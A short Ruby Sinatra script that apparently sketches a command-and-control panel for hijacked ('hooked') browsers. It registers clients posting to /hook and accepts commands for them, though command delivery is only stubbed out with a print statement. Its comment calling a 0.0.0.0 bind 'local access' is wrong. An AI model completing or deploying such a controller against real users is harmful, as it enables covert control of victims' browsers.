require 'sinatra'
require 'json'

# Store hooked clients
$hooked_clients = []

# Serve the control panel for hooked clients
get '/' do
  erb :index
end

# Endpoint to receive the hook from the client (browser)
post '/hook' do
  # Assuming client sends a JSON payload with a unique identifier (id) and IP address (ip)
  client_data = JSON.parse(request.body.read)
  
  # Add client data to hooked_clients array
  $hooked_clients << client_data
  
  # Respond with success
  status 200
  body 'Hooked'
end

# Endpoint to send commands to a specific hooked client
post '/send_command' do
  # Command data to send to the client
  command = params[:command]
  client_id = params[:client_id]
  
  # Find the client by ID
  client = $hooked_clients.find { |c| c['id'] == client_id }
  
  if client
    # Send the command (in this case just store it or print it)
    puts "Sending command '#{command}' to client #{client_id}"
    # Normally, here you would send this command to the client (using WebSockets, etc)
  end
  
  redirect '/'
end

# Start Sinatra server
set :bind, '0.0.0.0'  # Allow local access
set :port, 4567

